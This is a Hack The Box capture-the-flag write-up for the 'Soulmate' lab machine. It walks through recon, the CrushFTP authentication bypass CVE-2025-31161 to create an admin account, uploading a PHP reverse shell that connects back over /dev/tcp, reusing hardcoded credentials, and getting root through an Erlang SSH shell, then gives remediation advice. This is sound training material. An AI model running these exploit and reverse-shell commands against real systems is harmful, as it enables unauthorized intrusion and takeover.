# Soulmate — Hack The Box

## Machine Info

- Difficulty: Easy  
- OS: Linux  
- IP: 10.10.11.86  
- Release date: 2025-10-30  
- Points: 20

---

## Summary

Soulmate is an Easy Linux box.  
It exposes a CrushFTP web interface vulnerable to an authentication bypass, CVE-2025-31161.  
I created an admin user, used the web UI to upload a PHP reverse shell, and obtained a `www-data` shell.  
I found hardcoded SSH credentials in an Erlang startup script.  
I used those creds to access an Erlang-based SSH service running as root, and executed commands via the Erlang shell.  
Root was obtained.

---

## Recon

Run a quick nmap scan:

```bash
nmap -sC -sV -oN nmap_initial.txt 10.10.11.86
````

Key results:

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0
```

Add host entries:

```bash
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
```

Discover virtual hosts with ffuf:

```bash
ffuf -u http://10.10.11.86/ -H 'Host: FUZZ.soulmate.htb' \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac -t 50
```

Found `ftp.soulmate.htb`.
`ftp.soulmate.htb` runs CrushFTP, version 11.W.657.

---

## Initial Access

Search for CrushFTP exploits.
CVE-2025-31161 is an authentication bypass that allows creating admin users.

Exploit with the public script:

```bash
searchsploit -m 52295
python3 52295.py --target ftp.soulmate.htb --port 80 --check
python3 52295.py --target ftp.soulmate.htb --port 80 --exploit \
  --new-user hackerman --password 'Password123!'
```

Log in to CrushFTP web UI:

* URL: `http://ftp.soulmate.htb/WebInterface/login.html`
* User: `hackerman`
* Pass: `Password123!`

Use the file browser to inspect the filesystem.
Locate `/webProd/`, the web app root.

Create a PHP reverse shell:

```bash
cat > revshell.php << 'EOF'
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1'");
?>
EOF
```

Upload `revshell.php` via CrushFTP to `/webProd/`.

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the shell:

```bash
curl http://soulmate.htb/revshell.php
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

You now hold a `www-data` shell.

---

## Privilege Escalation to User

Enumerate services and files.

Check listening ports:

```bash
netstat -tulnp
```

Notable ports:

* `127.0.0.1:2222` LISTEN (internal SSH service)
* `0.0.0.0:4369` LISTEN (EPMD, Erlang Port Mapper Daemon)

Search for Erlang service files:

```bash
find / -name "*erlang*" -type f 2>/dev/null
cat /etc/systemd/system/erlang_ssh.service
```

Service runs as `root`:

```
ExecStart=/usr/local/bin/escript /usr/local/lib/erlang_login/start.escript
User=root
```

Read the startup script:

```bash
cat /usr/local/lib/erlang_login/start.escript
```

Found hardcoded credentials:

```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]}
```

SSH to the machine as `ben`:

```bash
ssh ben@10.10.11.86
# password: HouseH0ldings998
```

Read user flag:

```bash
cat /home/ben/user.txt
# HTB{redacted}
```

---

## Privilege Escalation to Root

Check sudo privileges:

```bash
sudo -l
# no sudo for ben
```

Connect to the Erlang SSH service on localhost as ben:

```bash
ssh ben@127.0.0.1 -p 2222
# password: HouseH0ldings998
```

You reach an Erlang shell:

```
Eshell V15.2.5
(ssh_runner@soulmate)1>
```

Erlang's `os:cmd/1` runs commands as the Erlang process user.
Verify root:

```erlang
os:cmd("whoami").
% "root\n"
```

Read root flag:

```erlang
os:cmd("cat /root/root.txt").
% "HTB{redacted}\n"
```

---

## Findings

* CVE-2025-31161, CrushFTP auth bypass.
* Web upload allowed PHP shells.
* Hardcoded credentials in a startup script.
* Erlang SSH service ran as root and allowed shell commands.

---

## Remediation

* Patch CrushFTP to a fixed version.
* Block web uploads of executable code. Validate content and store uploads outside web root.
* Remove hardcoded credentials. Use a secrets store with restricted access.
* Run services with least privilege. Avoid running network-exposed services as root.
* Restrict internal services. Do not expose sensitive internal interfaces to web processes.

---

## Tools

* nmap
* ffuf
* searchsploit
* netcat
* ssh
* python3

---

## Notes

* User flag: `HTB{redacted}`
* Root flag: `HTB{redacted}`
* Owned: 2025-10-30
* Platform: Hack The Box